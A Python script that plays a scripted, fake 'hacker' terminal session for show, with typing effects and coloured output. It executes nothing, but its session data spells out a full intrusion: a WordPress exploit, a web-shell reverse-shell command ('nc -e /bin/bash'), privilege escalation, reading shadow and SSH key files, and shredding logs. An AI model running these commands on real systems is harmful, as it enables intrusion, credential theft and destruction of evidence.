#!/usr/bin/env python3
"""
Cinematic Hack Terminal Simulator
================================
(Rest of the docstring remains the same)
"""
from __future__ import annotations

import argparse
import random
import sys
import time
from dataclasses import dataclass
from typing import List

# ══════════════════════════════ Colours ═══════════════════════════════════════
RESET = "\033[0m"
BOLD_GREEN = "\033[1;32m"
BOLD_RED = "\033[1;31m"
BOLD_YELLOW = "\033[1;33m"
CYAN = "\033[36m"

COLOUR_MAP = {
    "info": CYAN,
    "success": BOLD_GREEN,
    "error": BOLD_RED,
    "warn": BOLD_YELLOW,
}

# ═══════════════════════════════ Prompt ═══════════════════════════════════════
PROMPT = f"{BOLD_GREEN}\u2514\u2500(root\u24ffkali)-[~]\n\u2514\u2500$ {RESET}"

# ═════════════════════════════ Dataclass ═════════════════════════════════════
@dataclass
class Cmd:
    cmd: str
    output: str
    level: str = "info"  # info | success | error | warn

# ═══════════════════════════ I/O Helpers ══════════════════════════════════════

# --- MODIFIED type_print ---
def type_print(line: str, speed: float, base_delay: float, is_fast: bool) -> None:
    """Typewriter effect with more human-like pauses."""
    # Define pause parameters (tweak these for desired effect)
    prob_pause_after_space = 0.20  # 20% chance of a short pause after a space
    prob_general_pause = 0.04     # 4% chance of a short pause after any other char
    pause_duration_min = 0.08     # Min duration for these short pauses
    pause_duration_max = 0.28     # Max duration for these short pauses
    char_variance_multiplier = 4.5 # How much variance in normal char speed

    if is_fast:
        # In fast mode, disable longer pauses, minimal variance
        prob_pause_after_space = 0.0
        prob_general_pause = 0.0
        char_variance_multiplier = 1.5 # Minimal variance

    char_delay_min = speed
    char_delay_max = speed * char_variance_multiplier

    for i, ch in enumerate(line):
        sys.stdout.write(ch)
        sys.stdout.flush()

        # Determine base sleep duration for this character
        sleep_duration = random.uniform(char_delay_min, char_delay_max)

        # Check for adding an occasional longer pause (only in normal mode)
        should_pause = False
        if not is_fast:
            if ch == ' ' and random.random() < prob_pause_after_space:
                should_pause = True
            elif random.random() < prob_general_pause:
                # Avoid pausing immediately after a space pause
                if i > 0 and line[i-1] != ' ':
                     should_pause = True

            if should_pause:
                pause_time = random.uniform(pause_duration_min, pause_duration_max)
                sleep_duration += pause_time # Add the pause to the char delay

        time.sleep(sleep_duration)

    # Pause slightly before the "Enter" (newline)
    # Scale based on base_delay, but make very short in fast mode
    final_pause = random.uniform(base_delay * 0.3, base_delay * 0.7) if not is_fast else 0.01
    time.sleep(final_pause)

    sys.stdout.write("\n")
    sys.stdout.flush()
# --- END MODIFIED type_print ---

def system_response(text: str, level: str, base_delay: float) -> None:
    """Colour‑coded, slightly delayed system feedback."""
    colour = COLOUR_MAP.get(level, CYAN)
    # Keep system response timing as it was
    time.sleep(random.uniform(base_delay * 0.8, base_delay * 1.2))
    for ln in text.strip().splitlines():
        sys.stdout.write(f"{colour}{ln}{RESET}\n")
    sys.stdout.flush()

# ═════════════════════════════ Runner ════════════════════════════════════════

def run_session(session: List[Cmd], speed: float, base_delay: float, is_fast: bool) -> None:
    """Runs the simulated terminal session."""
    for entry in session:
        # 1. Print the prompt instantly without a newline at the very end
        sys.stdout.write(PROMPT)
        sys.stdout.flush()

        # 2. Type out only the command part using the human-like effect
        #    type_print will handle adding the final newline after the command.
        type_print(entry.cmd, speed, base_delay, is_fast)

        # 3. Handle system response (this part remains the same)
        if entry.output:
            system_response(entry.output, entry.level, base_delay)
        # Small delay even if no output (unless fast)
        elif not is_fast:
             time.sleep(random.uniform(base_delay * 0.2, base_delay * 0.4))

# ═════════════════════════════ Script ════════════════════════════════════════

def main() -> None:
    """Parses arguments and runs the session."""
    ap = argparse.ArgumentParser(
        description="Play a cinematic hacking session.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    ap.add_argument(
        "--fast",
        action="store_true",
        help="Skip most delays and typing effects for quick previews" # Updated help text
    )
    args = ap.parse_args()

    char_type_speed = 0.005 if args.fast else 0.04 # Adjusted base speed slightly
    system_response_delay = 0.02 if args.fast else 0.35

    # --- Session data remains the same ---
    session: List[Cmd] = [
        Cmd("clear", "[*] Initializing recon terminal...", "success"),

        # ── Recon ────────────────────────────────────────────────────────────
        Cmd("whois vulnerablecorp.com", """
Domain Name: VULNERABLECORP.COM
Registrar: NameCheap, Inc.
Name Server: NS1.VULNERABLECORP.COM
Name Server: NS2.VULNERABLECORP.COM
Updated Date: 01-jan-2024
Creation Date: 01-jan-2018
"""), # Uses default level="info"
        Cmd("nmap -T4 -p- vulnerablecorp.com", """
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for vulnerablecorp.com (10.10.10.51)
Host is up (0.12s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
3306/tcp open  mysql
"""), # Uses default level="info"
        Cmd("whatweb http://vulnerablecorp.com", """
http://vulnerablecorp.com [200 OK] Country[US] IP[10.10.10.51] Apache[2.4.7] PHP[5.6.30] X-Powered-By[PHP/5.6.30] WordPress[4.7.0]
"""), # Uses default level="info"
        Cmd("searchsploit WordPress 4.7", """
----------------------------------------------------------
 Exploit Title                                   | Path
----------------------------------------------------------
WordPress Core <= 4.7 - REST API User Enumeration | php/webapps/46635.txt
WordPress 4.7 - Content Injection (REST API)     | php/webapps/41288.py
----------------------------------------------------------
"""), # Uses default level="info"

        # ── Exploitation ─────────────────────────────────────────────────────
        Cmd("cp /usr/share/exploitdb/exploits/php/webapps/41288.py wp_inject.py", "[*] Copied exploit locally.", "success"), # Slightly better output
        Cmd("nano wp_inject.py", "[*] Editing exploit: adjusted POST payload...", "info"), # Slightly better output
        Cmd("python3 wp_inject.py http://vulnerablecorp.com", """
[+] Target: http://vulnerablecorp.com
[+] Injecting post via REST API...
[-] Error: POST failed — received HTTP 403 Forbidden. Target patched? Firewall?
""", "error"), # Slightly more realistic error msg
        Cmd("python3 wp_inject.py --force-auth-bypass http://vulnerablecorp.com", """
[+] Target: http://vulnerablecorp.com
[+] Applying auth bypass technique...
[+] Injecting post via REST API...
[+] Post modified successfully! Verify content injection.
""", "success"), # Slightly different command/output
        Cmd("curl -s http://vulnerablecorp.com | grep 'Hacked by'", "<h2 class=\"entry-title\">Hacked by RedTeam</h2>", "success"), # Changed grep term and output for variety

        # ── Initial Shell ────────────────────────────────────────────────────
        Cmd("nc -nvlp 4444", "[*] Setting up listener on port 4444...", "info"),
        Cmd("# (Opened reverse shell connection in separate process/tab)", "", "info"),
        Cmd("curl http://vulnerablecorp.com/uploads/shell.php?cmd=nc%20-e%20/bin/bash%2010.10.10.2%204444", ""), # URL encode the command
        Cmd("whoami", "www-data", level="success"),
        Cmd("uname -a", "Linux websrv01 4.4.0-116-generic #140-Ubuntu SMP x86_64 GNU/Linux", level="success"),

        # ── Priv-Esc ─────────────────────────────────────────────────────────
        Cmd("find / -type f -user root -perm -4000 -print 2>/dev/null", """
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/opt/legacy-backup-util
""", "info"),
        Cmd("./exploit_suid_legacy.sh", """
[*] Running legacy SUID exploit...
[*] Creating temporary shell script...
[*] Triggering overflow...
[*] Got root! Enjoy the shell.
root@websrv01:/var/www/html#
""", "success"),
        Cmd("id", "uid=0(root) gid=0(root) groups=0(root),0(root)", level="success"),
        Cmd("hostname", "websrv01.internal", level="success"),

        # ── Loot ─────────────────────────────────────────────────────────────
        Cmd("cat /etc/shadow | grep '^root:'", "root:$6$rounds=5000$longsaltstring$aVeryLongHashedPasswordString...:19276:0:99999:7:::", level="success"),
        Cmd("ls -la /var/www/html/wp-content/uploads", """
total 24
drwxrwxr-x 2 www-data www-data 4096 Apr 28 10:15 .
drwxr-xr-x 5 www-data www-data 4096 Apr 27 16:42 ..
-rw-rw-r-- 1 www-data www-data  112 Apr 28 10:15 shell.php
-rw-r--r-- 1 www-data www-data 8765 Apr 27 17:01 site_backup_20240115.sql.gz
""", level="success"),
        Cmd("zcat /var/www/html/wp-content/uploads/site_backup_20240115.sql.gz | grep wp_users", """
INSERT INTO `wp_users` VALUES (1,'admin','$P$Byourpasswordhashhere...','admin','admin@vulnerablecorp.com','','2018-01-01 00:00:00','',0,'Administrator');
INSERT INTO `wp_users` VALUES (2,'editor','$P$Banotherhashhere...','editor','editor@vulnerablecorp.com','','2020-05-10 11:30:00','',0,'Editor');
""", level="success"),
        Cmd("netstat -tulnp | grep LISTEN", """
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1234/mysqld
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      888/sshd
tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      777/redis-server
tcp6       0      0 :::80                   :::*                    LISTEN      932/apache2
tcp6       0      0 :::443                  :::*                    LISTEN      933/apache2
""", level="success"),
        Cmd("crontab -l", """
# Min Hour Day Month DayOfWeek Command
*/5 * * * * /usr/local/bin/monitor_load.sh
0 1 * * * /opt/scripts/nightly_cleanup.sh >> /var/log/cleanup.log 2>&1
# @reboot /usr/bin/python3 /root/persistence.py # Commented out persistence?
""", level="success"),
        Cmd("cat /root/.ssh/id_rsa", """
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAz... (long key omitted for brevity) ...
-----END RSA PRIVATE KEY-----
""", level="success"),

        # ── Cover Tracks & Exit ───────────────────────────────────────────────
        Cmd("history -c", "[*] Cleared bash history", "success"),
        Cmd("rm /var/www/html/wp-content/uploads/shell.php", "[*] Removed web shell", "success"),
        Cmd("rm /tmp/exploit* /tmp/passwd.bak", "[*] Cleaned up /tmp files", "success"),
        Cmd("find /var/log -type f -exec shred -n 1 -z -u {} \\;", "[*] Securely shredding log files...", "success"),
        Cmd("exit", "[+] Root shell closed. Exfiltration complete. Mission accomplished.", "success"),
    ]

    try:
        # --- Pass args.fast to run_session ---
        run_session(session, char_type_speed, system_response_delay, args.fast)
    except KeyboardInterrupt:
        print(f"\n{BOLD_YELLOW}[!] Session interrupted by user.{RESET}")
        sys.exit(0)


if __name__ == "__main__":
    main()